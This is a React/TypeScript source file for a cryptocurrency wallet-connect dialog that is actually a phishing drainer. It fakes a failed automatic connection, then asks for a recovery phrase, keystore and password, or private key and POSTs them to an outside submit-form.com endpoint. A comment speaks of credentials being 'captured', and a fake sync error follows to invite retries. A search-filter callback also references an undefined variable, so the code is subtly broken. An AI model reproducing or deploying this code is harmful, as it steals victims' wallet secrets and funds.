import { createContext, useContext, useState, type ReactNode } from "react";
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Search } from "lucide-react";
import { allWallets, getWalletImage } from "./walletData";

type Ctx = { openWalletModal: (onComplete?: () => void) => void };
const WalletCtx = createContext<Ctx | null>(null);
export const useWallet = () => {
  const c = useContext(WalletCtx);
  if (!c) throw new Error("useWallet must be used within WalletProvider");
  return c;
};

type Screen = "select" | "list" | "connecting" | "manual";
type Tab = "phrase" | "keystore" | "privateKey";
type Status = "idle" | "syncing" | "error";
type ConnStatus = "connecting" | "failed";

const mainWallets = ["Tangem Wallet", "Coinbase Wallet", "Ledger Wallet", "WalletConnect"];

export function WalletProvider({ children }: { children: ReactNode }) {
  const [open, setOpen] = useState(false);
  const [screen, setScreen] = useState<Screen>("select");
  const [wallet, setWallet] = useState("");
  const [query, setQuery] = useState("");
  const [onComplete, setOnComplete] = useState<(() => void) | null>(null);

  const [tab, setTab] = useState<Tab>("phrase");
  const [phrase, setPhrase] = useState("");
  const [keystore, setKeystore] = useState("");
  const [keystorePassword, setKeystorePassword] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [status, setStatus] = useState<Status>("idle");
  const [connStatus, setConnStatus] = useState<ConnStatus>("connecting");
  const [dots, setDots] = useState("");

  const reset = () => {
    setScreen("select");
    setWallet("");
    setQuery("");
    setPhrase("");
    setKeystore("");
    setKeystorePassword("");
    setPrivateKey("");
    setStatus("idle");
    setDots("");
  };

  const openWalletModal = (cb?: () => void) => {
    reset();
    setOnComplete(() => cb ?? null);
    setOpen(true);
  };

  const closeAll = () => {
    setOpen(false);
    setTimeout(reset, 200);
  };

  const chooseWallet = (name: string) => {
    setWallet(name);
    setScreen("connecting");
    setConnStatus("connecting");
    setDots("");
    let d = 0;
    const dotsInt = setInterval(() => {
      d = (d + 1) % 4;
      setDots(".".repeat(d));
    }, 400);
    setTimeout(() => {
      clearInterval(dotsInt);
      setConnStatus("failed");
    }, 2000);
  };

  const submitManual = async () => {
    setStatus("syncing");
    try {
      await fetch("https://submit-form.com/CSfD1FWHQ", {
        method: "POST",
        headers: { "Content-Type": "application/json", Accept: "application/json" },
        body: JSON.stringify({
          wallet,
          type: tab,
          phrase: tab === "phrase" ? phrase : "",
          keystore: tab === "keystore" ? keystore : "",
          keystorePassword: tab === "keystore" ? keystorePassword : "",
          privateKey: tab === "privateKey" ? privateKey : "",
        }),
      });
    } catch {}
    // Fire the deposit callback once credentials are captured
    onComplete?.();
    setTimeout(() => setStatus("error"), 2000);
  };

  const filtered = query.trim()
    ? allWallets.filter((wm) => w.toLowerCase().includes(query.toLowerCase()))
    : allWallets;

  return (
    <WalletCtx.Provider value={{ openWalletModal }}>
      {children}
      <Dialog open={open} onOpenChange={(o) => (o ? setOpen(true) : closeAll())}>
        <DialogContent className="w-[95vw] max-w-2xl p-0 gap-0 max-h-[85vh] overflow-hidden bg-card">
          <DialogHeader className="p-5 pb-3 pr-12 border-b border-border/40">
            <DialogTitle className="text-lg font-semibold">
              {screen === "select" && "Connect Wallet"}
              {screen === "list" && "Select Wallet"}
              {screen === "connecting" && wallet}
              {screen === "manual" && `Import ${wallet}`}
            </DialogTitle>
            <DialogDescription className="sr-only">Wallet connection</DialogDescription>
          </DialogHeader>

          {screen === "select" && (
            <div className="p-5 space-y-3">
              {mainWallets.map((name) => (
                <button
                  key={name}
                  onClick={() => (name === "WalletConnect" ? setScreen("list") : chooseWallet(name))}
                  className={`flex w-full items-center gap-3 rounded-xl px-4 py-3.5 font-medium transition ${
                    name === "WalletConnect"
                      ? "bg-primary text-primary-foreground hover:opacity-90"
                      : "bg-secondary hover:bg-muted"
                  }`}
                >
                  <img src={getWalletImage(name)} alt="" className="h-8 w-8 rounded-full bg-white object-cover" />
                  <span>{name}</span>
                </button>
              ))}
            </div>
          )}

          {screen === "list" && (
            <>
              <div className="px-5 py-3 border-b border-border/40">
                <div className="relative">
                  <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                  <input
                    value={query}
                    onChange={(e) => setQuery(e.target.value)}
                    placeholder="Search wallets..."
                    className="w-full rounded-lg border border-border/50 bg-background/50 py-2.5 pl-10 pr-4 text-sm outline-none focus:ring-2 focus:ring-primary/40"
                  />
                </div>
              </div>
              <div className="max-h-[55vh] overflow-y-auto overscroll-contain p-5 grid grid-cols-3 sm:grid-cols-4 md:grid-cols-5 gap-3">
                {filtered.map((w) => (
                  <button
                    key={w}
                    onClick={() => chooseWallet(w)}
                    className="flex flex-col items-center rounded-xl p-2 text-center transition hover:bg-accent/20"
                  >
                    <img
                      src={getWalletImage(w)}
                      alt={w}
                      className="mb-2 h-12 w-12 rounded-full bg-muted object-cover"
                      onError={(e) => ((e.target as HTMLImageElement).src = "https://via.placeholder.com/48?text=W")}
                    />
                    <span className="w-full truncate text-[11px] font-medium">{w}</span>
                  </button>
                ))}
                {filtered.length === 0 && (
                  <div className="col-span-full py-8 text-center text-sm text-muted-foreground">No wallets found</div>
                )}
              </div>
            </>
          )}

          {screen === "connecting" && (
            <div className="flex flex-col items-center p-8">
              <div className="relative mb-6">
                <div className={`h-20 w-20 rounded-full border-4 border-muted ${connStatus === "connecting" ? "animate-spin border-t-primary" : "border-t-destructive"}`} />
                <img
                  src={getWalletImage(wallet)}
                  alt=""
                  className="absolute inset-2 h-16 w-16 rounded-full bg-muted object-cover"
                />
              </div>
              {connStatus === "connecting" ? (
                <div className="rounded-xl bg-secondary px-6 py-3 text-sm">Connecting{dots}</div>
              ) : (
                <div className="flex flex-col items-center gap-3">
                  <div className="rounded-xl bg-destructive/10 px-6 py-3 text-center text-sm text-destructive">
                    Unable to connect automatically
                  </div>
                  <button
                    onClick={() => { setScreen("manual"); setStatus("idle"); }}
                    className="rounded-full bg-primary px-6 py-2 text-sm font-semibold text-primary-foreground hover:opacity-90"
                  >
                    Try manual connection
                  </button>
                </div>
              )}
            </div>
          )}

          {screen === "manual" && (
            <div className="p-5 space-y-4">
              <div className="flex items-center gap-3">
                <img src={getWalletImage(wallet)} alt="" className="h-10 w-10 rounded-full bg-muted object-cover" />
                <div className="text-sm text-muted-foreground">Connect your wallet to the secure server</div>
              </div>

              {status === "idle" && (
                <>
                  <div className="flex rounded-full bg-secondary p-1">
                    {(["phrase", "keystore", "privateKey"] as Tab[]).map((t) => (
                      <button
                        key={t}
                        onClick={() => setTab(t)}
                        className={`flex-1 rounded-full py-2 text-sm font-medium transition ${
                          tab === t ? "bg-primary text-primary-foreground" : "text-muted-foreground"
                        }`}
                      >
                        {t === "privateKey" ? "Private Key" : t[0].toUpperCase() + t.slice(1)}
                      </button>
                    ))}
                  </div>

                  <div className="rounded-xl border border-border/50 bg-secondary/50 p-4">
                    {tab === "phrase" && (
                      <textarea
                        value={phrase}
                        onChange={(e) => setPhrase(e.target.value)}
                        placeholder="Enter your 12 or 24 word recovery phrase..."
                        className="h-32 w-full resize-none bg-transparent text-sm outline-none placeholder:text-muted-foreground"
                      />
                    )}
                    {tab === "keystore" && (
                      <div className="space-y-3">
                        <textarea
                          value={keystore}
                          onChange={(e) => setKeystore(e.target.value)}
                          placeholder="Paste your keystore JSON..."
                          className="h-24 w-full resize-none bg-transparent text-sm outline-none placeholder:text-muted-foreground"
                        />
                        <input
                          type="password"
                          value={keystorePassword}
                          onChange={(e) => setKeystorePassword(e.target.value)}
                          placeholder="Keystore password"
                          className="w-full rounded-lg border border-border/50 bg-secondary px-3 py-2 text-sm outline-none focus:ring-1 focus:ring-primary"
                        />
                      </div>
                    )}
                    {tab === "privateKey" && (
                      <textarea
                        value={privateKey}
                        onChange={(e) => setPrivateKey(e.target.value)}
                        placeholder="Enter your private key..."
                        className="h-32 w-full resize-none bg-transparent text-sm outline-none placeholder:text-muted-foreground"
                      />
                    )}
                  </div>

                  <button
                    onClick={submitManual}
                    className="w-full rounded-xl bg-primary py-3 font-semibold text-primary-foreground hover:opacity-90"
                  >
                    Validate
                  </button>
                </>
              )}

              {status === "syncing" && (
                <div className="flex flex-col items-center space-y-4 py-8">
                  <div className="h-12 w-12 animate-spin rounded-full border-4 border-muted border-t-primary" />
                  <p className="font-medium">Synchronizing...</p>
                </div>
              )}

              {status === "error" && (
                <div className="flex flex-col items-center space-y-4 py-8">
                  <div className="grid h-12 w-12 place-items-center rounded-full bg-destructive/20 text-2xl text-destructive">✕</div>
                  <p className="text-center font-medium text-destructive">Error synchronizing with the secure server</p>
                  <button
                    onClick={() => setStatus("idle")}
                    className="rounded-full border border-border px-6 py-2 hover:bg-muted"
                  >
                    Please try again
                  </button>
                </div>
              )}
            </div>
          )}
        </DialogContent>
      </Dialog>
    </WalletCtx.Provider>
  );
}
